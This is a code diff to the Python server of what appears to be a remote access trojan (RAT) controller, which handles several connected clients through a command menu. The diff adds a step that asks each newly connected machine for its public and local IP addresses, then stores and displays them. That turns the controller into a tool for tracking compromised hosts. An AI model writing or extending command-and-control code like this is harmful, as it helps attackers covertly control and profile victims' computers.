@@ -1,13 +1,12 @@
 import socket
-import select
 import sys
 import threading
-import os
-import platform
+import argparse
 import time
-import colorama # type: ignore
-# import pdb # Add import for Python debugger
-from colorama import Fore, Style, Back # type: ignore
+import json
+import os
+import colorama  # type: ignore
+from colorama import Fore, Style, Back  # type: ignore
 from modules.rat_server_utils import (
     clear_screen,
     handle_client_disconnect,
@@ -19,8 +18,6 @@ from modules.server_command_processor import process_command, process_menu_choic
 from modules.client_manager import list_clients
 from modules.server_formatings import show_loading_animation, show_server_restart_animation
 from modules.server_ui_utils import print_banner, print_prompt, show_main_menu, show_options_panel
-import argparse
-import json
 
 # Initialize colorama
 colorama.init(autoreset=True)
@@ -112,6 +109,7 @@ MAX_CLIENTS = args.max_clients
 
 # Global variables
 client_sockets = [None] * MAX_CLIENTS
+client_info = [None] * MAX_CLIENTS  # Store client information including public IP
 active_client = -1
 running = True
 server_running = False
@@ -138,10 +136,15 @@ def center_text(text):
 
 def handle_client_disconnect_wrapper_local(client_id):
     """Wrapper for handle_client_disconnect to be used locally"""
-    global active_client, client_sockets
+    global active_client, client_sockets, client_info
     new_active_client = handle_client_disconnect(client_id, client_sockets, active_client)
     if new_active_client is not None:
         active_client = new_active_client
+    
+    # Clear client info when disconnecting
+    if 0 <= client_id < len(client_info):
+        client_info[client_id] = None
+    
     return active_client
 
 def start_server():
@@ -210,6 +213,7 @@ def stop_server():
             except:
                 pass
             client_sockets[i] = None
+            client_info[i] = None  # Clear client info as well
 
     # Close server socket
     if server_socket:
@@ -239,12 +243,59 @@ def accept_connections(server_socket):
             for i in range(MAX_CLIENTS):
                 if client_sockets[i] is None:
                     client_sockets[i] = client
-
-                    # Show toast notification for new connection
-                    # Changed location to bottom-right
-                    notification = f"New client {i}: {addr[0]}:{addr[1]}"
+                    
+                    # Request client's public IP information
+                    try:
+                        client.send("get_public_ip_info".encode())
+                        client.settimeout(5.0)  # 5 second timeout
+                        response = client.recv(1024).decode('utf-8', errors='replace')
+                        client.settimeout(None)  # Reset timeout
+                        
+                        # Parse the response to get public IP info
+                        if response and "Public IP:" in response:
+                            lines = response.split('\n')
+                            public_ip = "Unknown"
+                            local_ip = addr[0]
+                            
+                            for line in lines:
+                                if "Public IP:" in line:
+                                    public_ip = line.split(': ')[-1].strip()
+                                elif "Local IP:" in line:
+                                    local_ip = line.split(': ')[-1].strip()
+                            
+                            # Store client information
+                            client_info[i] = {
+                                'public_ip': public_ip,
+                                'local_ip': local_ip,
+                                'connection_ip': addr[0],
+                                'port': addr[1],
+                                'connected_at': time.time()
+                            }
+                            
+                            # Show toast notification with public IP
+                            notification = f"New client {i}: {public_ip} (Public IP)"
+                        else:
+                            # Fallback to connection IP if public IP detection fails
+                            client_info[i] = {
+                                'public_ip': addr[0],
+                                'local_ip': addr[0],
+                                'connection_ip': addr[0],
+                                'port': addr[1],
+                                'connected_at': time.time()
+                            }
+                            notification = f"New client {i}: {addr[0]}:{addr[1]}"
+                    except:
+                        # Fallback if IP detection fails
+                        client_info[i] = {
+                            'public_ip': addr[0],
+                            'local_ip': addr[0],
+                            'connection_ip': addr[0],
+                            'port': addr[1],
+                            'connected_at': time.time()
+                        }
+                        notification = f"New client {i}: {addr[0]}:{addr[1]}"
+                    
                     show_toast_notification(notification, 1, position="bottom-right")
-
                     break
             else:
                 # If no empty slot, reject the connection
@@ -553,7 +604,7 @@ def main():
                 choice, lambda: show_main_menu(server_running, HOST, PORT, client_sockets, MAX_CLIENTS),
                 start_server, stop_server, server_running, list_clients, client_sockets,
                 active_client, client_handler_command_mode, show_options_panel_wrapper,
-                show_client_commands, running
+                show_client_commands, running, client_info
             )
 
             active_client = new_active_client
